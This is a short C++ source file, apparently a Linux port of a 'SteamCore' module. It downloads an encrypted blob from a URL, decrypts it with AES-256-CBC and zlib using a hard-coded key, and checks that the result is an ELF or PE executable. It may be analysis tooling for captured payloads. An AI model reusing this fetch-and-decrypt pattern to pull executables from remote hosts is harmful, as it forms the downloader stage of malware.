
// SteamCore - core (Linux port of core.cpp)
#include "steamcore.h"
#include <cstring>
#include <curl/curl.h>
#include <stdexcept>

namespace steamcore {

namespace {

size_t write_cb(void* ptr, size_t size, size_t nmemb, void* user) {
    auto* v = static_cast<std::vector<uint8_t>*>(user);
    size_t real = size * nmemb;
    v->insert(v->end(), static_cast<uint8_t*>(ptr),
              static_cast<uint8_t*>(ptr) + real);
    return real;
}

std::vector<uint8_t> http_get(const std::string& url) {
    std::vector<uint8_t> buf;
    CURL* c = curl_easy_init();
    if (!c) throw std::runtime_error("curl init");
    curl_easy_setopt(c, CURLOPT_URL, url.c_str());
    curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(c, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(c, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(c, CURLOPT_TIMEOUT, 60L);
    CURLcode r = curl_easy_perform(c);
    curl_easy_cleanup(c);
    if (r != CURLE_OK) throw std::runtime_error(curl_easy_strerror(r));
    return buf;
}

// ELF payload validity check: real payload after decrypt should be a valid ELF.
bool is_valid_elf(const std::vector<uint8_t>& buf) {
    if (buf.size() < 16) return false;
    return buf[0] == 0x7F && buf[1] == 'E' && buf[2] == 'L' && buf[3] == 'F';
}

bool is_valid_pe(const std::vector<uint8_t>& buf) {
    if (buf.size() < 0x40 + 6) return false;
    if (buf[0] != 'M' || buf[1] != 'Z') return false;
    uint32_t e_lfanew = 0;
    memcpy(&e_lfanew, buf.data() + 0x3C, 4);
    if (e_lfanew + 6 > buf.size()) return false;
    return buf[e_lfanew] == 'P' && buf[e_lfanew + 1] == 'E';
}

}  // namespace (anon)

// Decrypt a payload captured from a /version or core channel.
// Accepts ELF64 (Linux) or PE (Windows) - returns true if decrypt succeeded
// and produces a recognizable ELF/PE.
bool fetch_core_payload(const std::string& url, std::vector<uint8_t>& out) {
    std::vector<uint8_t> enc = http_get(url);
    out = aes256cbc_zlib_decrypt(enc, kCoreKey);
    return is_valid_elf(out) || is_valid_pe(out);
}

std::vector<uint8_t> fetch_core_from(const std::string& url) {
    std::vector<uint8_t> enc = http_get(url);
    return aes256cbc_zlib_decrypt(enc, kCoreKey);
}

}  // namespace steamcore
